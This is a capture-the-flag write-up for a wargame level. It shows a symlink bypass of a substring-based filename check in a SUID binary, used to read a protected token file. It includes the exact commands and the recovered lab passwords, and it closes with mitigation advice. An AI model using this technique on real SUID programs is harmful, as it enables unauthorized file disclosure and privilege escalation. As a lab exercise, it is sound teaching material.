# level08

## Goal

Read the contents of the protected `token` file using a vulnerable SUID binary.

## Enumeration

List the files:

```bash
ls -l
```

Output:

```text
-rwsr-s--- 1 flag08 level08 level08
-rw------- 1 flag08 flag08 token
```

Inspect the binary:

```bash
file level08
strings level08
```

Interesting strings:

```text
token
You may not access '%s'
open
read
write
strstr
```

## Analysis

The binary accepts a filename as an argument and refuses access if the provided path contains the string:

```text
token
```

The presence of `strstr()` strongly suggests that the program performs a simple substring check similar to:

```c
if (strstr(argv[1], "token"))
{
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
}
```

If the check succeeds, the program simply:

```c
open()
read()
write()
```

the requested file.

The vulnerability is that the program validates the **path string** instead of the **actual file** being opened.

## Exploitation

Create a symbolic link pointing to the protected file:

```bash
ln -s ~/token /tmp/test
```

Execute the SUID binary using the symbolic link:

```bash
./level08 /tmp/test
```

The supplied path:

```text
/tmp/test
```

does not contain the word `token`, so the blacklist is bypassed.

`open()` automatically follows the symbolic link and opens:

```text
~/token
```

with the privileges of `flag08`.

## Validation

Output:

```text
quif5eloekouj29ke0vouxean
```

Use the recovered password:

```bash
su flag08
getflag
```

Output:

```text
Check flag.Here is your token :
25749xKZ8L7DkSCwJkT9dyv6f
```

The returned token is the password for `level09`.

## Concept

Execution flow:

```text
User input
    ↓
"/tmp/test"
    ↓
strstr(path, "token")
    ↓
No match
    ↓
open("/tmp/test")
    ↓
Symbolic link resolution
    ↓
~/token
    ↓
read()
    ↓
Protected file disclosed
```

## Security Impact

This level demonstrates an **Improper Path Validation** vulnerability.

Checking a filename with a blacklist is not sufficient because multiple paths can reference the same file.

Safer approaches include:

* resolving the canonical path (`realpath()`);
* validating the resolved path instead of the user input;
* opening the file with `O_NOFOLLOW` when symbolic links should not be accepted;
* verifying ownership and permissions after opening the file.

## Resources

Useful commands:

```bash
file level08
strings level08

ln -s ~/token /tmp/test
./level08 /tmp/test

su flag08
getflag
```
